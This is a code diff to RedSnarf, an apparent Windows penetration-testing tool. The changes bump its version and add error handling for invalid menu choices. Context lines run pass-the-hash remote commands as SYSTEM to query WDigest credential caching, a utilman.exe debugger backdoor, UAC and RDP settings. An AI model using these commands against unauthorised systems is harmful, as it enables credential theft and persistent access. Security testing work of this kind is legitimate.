@@ -56,7 +56,7 @@ from impacket.dcerpc.v5 import transport, samr
 from impacket import ntlm
 from time import strftime, gmtime
 
-yesanswers = ["yes", "y", "Y", "Yes", "YES"]
+yesanswers = ["yes", "y", "Y", "Yes", "YES", "pwn", "PWN"]
 noanswers = ["no", "NO", "n", "N"]
 events_logs = ["application","security","setup","system"]
 
@@ -1367,7 +1367,7 @@ def run():
 			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
 					
 			if x==None or x==True:
-								
+			
 				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession()==0:
 					print colored("[+]"+host+" Creds OK, User Session Granted",'green')
 					logging.info("[+]"+host+" Creds OK, User Session Granted")
@@ -1679,7 +1679,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3q", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3r", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2540,7 +2540,12 @@ if edq_scforceoption!='n':
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
+				sys.exit()
+
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
 				sys.exit()	
+			
 		except OSError:
 				print colored("[-]Something went wrong whilst using the SCforceoption...",'red')
 				logging.error("[-]Something went wrong whilst using the SCforceoption")
@@ -2585,6 +2590,11 @@ if edq_SingleSessionPerUser!='n':
 				print proc.communicate()[0]
 				
 				sys.exit()	
+
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
+				sys.exit()	
+		
 		except OSError:
 				print colored("[-]Something went wrong whilst using SingleSessionPerUser setting...",'red')
 				logging.error("[-]Something went wrong whilst using SingleSessionPerUser setting")
@@ -2628,7 +2638,12 @@ if edq_allowtgtsessionkey!='n':
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
+				sys.exit()
+
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
 				sys.exit()	
+			
 		except OSError:
 				print colored("[-]Something went wrong whilst using allowtgtsessionkey setting...",'red')
 				logging.error("[-]Something went wrong whilst using allowtgtsessionkey setting")
@@ -2685,6 +2700,11 @@ if edq_autologon!='n':
 				print proc.communicate()[0]
 				
 				sys.exit()	
+
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
+				sys.exit()	
+		
 		except OSError:
 				print colored("[-]Something went wrong whilst using AutoLogon setting...",'red')
 				logging.error("[-]Something went wrong whilst using AutoLogon setting")
@@ -2742,8 +2762,11 @@ if edq_wdigest!='n':
 				print colored("[+]Querying the status of Wdigest:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
-				
+				sys.exit()
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
 				sys.exit()	
+
 		except OSError:
 				print colored("[-]Something went wrong whilst using Wdigest setting",'red')
 				logging.error("[-]Something went wrong whilst using Wdigest setting")
@@ -2784,6 +2807,10 @@ if edq_nla!='n':
 
 				sys.exit()
 
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
+				sys.exit()	
+		
 		except OSError:
 				print colored("[-]Something went wrong whilst using NLA setting...",'red')
 				logging.error("[-]Something went wrong whilst using NLA setting")
@@ -2830,11 +2857,16 @@ if edq_trdp!='n':
 				print colored("[+]Querying the status of RDP Port:",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
 
+				sys.exit()
+
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
 				sys.exit()	
+
 		except OSError:
 				print colored("[-]Something went wrong whilst using the change the RDP Port setting...",'red')
 				logging.error("[-]Something went wrong whilst using the change the RDP Port setting")
-				sys.exit()	
+				sys.exit()
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
@@ -2882,7 +2914,12 @@ if edq_rdp!='n':
 				print colored("[+]Querying the status of RDP:",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
 
+				sys.exit()
+
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
 				sys.exit()	
+
 		except OSError:
 				print colored("[-]Something went wrong whilst using the RDP setting...",'red')
 				logging.error("[-]Something went wrong whilst using the RDP setting")
@@ -2951,6 +2988,11 @@ if edq_backdoor!='n':
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\"' 2>/dev/null")
 
 				sys.exit()	
+		
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
+				sys.exit()	
+
 		except OSError:
 				print colored("[-]Something went wrong whilst using the Backdoor setting...",'red')
 				logging.error("[-]Something went wrong whilst using the Backdoor setting")
@@ -2986,7 +3028,12 @@ if edq_uac!='n':
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" ' 2>/dev/null")
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" ' 2>/dev/null")
 
+				sys.exit()
+
+			else:
+				print colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red')
 				sys.exit()	
+			
 		except OSError:
 				print colored("[-]Something went wrong whilst using the UAC setting...",'red')
 				logging.error("[-]Something went wrong whilst using the UAC setting")
